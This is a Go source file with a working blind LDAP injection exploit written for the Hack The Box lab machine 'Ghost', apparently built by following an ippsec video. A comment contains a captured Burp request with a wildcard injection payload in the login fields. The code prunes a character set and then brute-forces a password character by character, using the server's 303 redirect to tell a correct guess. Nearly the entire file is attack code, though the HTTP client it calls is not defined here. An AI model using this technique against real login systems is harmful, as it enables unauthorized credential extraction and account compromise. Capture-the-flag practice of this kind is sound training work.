package main

import (
	"fmt"
	"strconv"
)

/**
Followed ippsec video on how to build the LDAP Injection program...
1. Loved how he enumerated and created the charset
2. Great explaination...

HTB: Ghost

Burp Suite Request
---------------------
POST /login HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Next-Action: c471eb076ccac91d6f828b671795550fd5925940
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Content-Length: 46
Connection: keep-alive

1_ldap-username=*&1_ldap-secret=*&0=[{},"$K1"]

**/

/**

// The ...string allows you to pass in a list in double-quotes and commas as shown below into a slice...
func PrintLines(line ...string) {
	for _, l := range line {
		fmt.Println(l)
	}
}

PrintLines("username", "password")

**/

type Injector interface {
	Do(password string) (bool, error)
}

type LdapInjector struct {
	Client  Injector
	Charset string
}

func NewLdapInjector(client Injector) *LdapInjector {
	return &LdapInjector{
		Client:  client,
		Charset: CreateCharset(),
	}
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		if ok, err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
			return "", err
		} else if ok {
			return string(c), nil
		}
	}

	return "", nil
}

func (li *LdapInjector) Brute() (string, error) {
	var result string
	for {
		c, err := li.TestCharacter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			break
		}
		result += c
	}
	return result, nil
}

func (li *LdapInjector) PruneCharset() error {
	var newCharset string
	for _, char := range li.Charset {

		if ok, err := li.Client.Do(fmt.Sprintf("*%s*", string(char))); err != nil {
			return nil
		} else if ok {
			newCharset += string(char)
		}
	}
	li.Charset = newCharset
	return nil
}

func CreateCharset() string {
	var charset string
	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}
	for i := range 10 {
		c := strconv.Itoa(i)
		charset += c
	}
	return charset
}

func main() {
	httpClient := NewFastBruteImpl("POST", "http://intranet.ghost.htb:8008/login", "gitea_temp_principal", 303,
		map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"Next-Action":  "c471eb076ccac91d6f828b671795550fd5925940",
		})
	c := NewLdapInjector(httpClient)

	fmt.Println("Charset: ", c.Charset)
	c.PruneCharset()
	fmt.Println("New Charset: ", c.Charset)
	password, err := c.Brute()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Password: ", password)

}
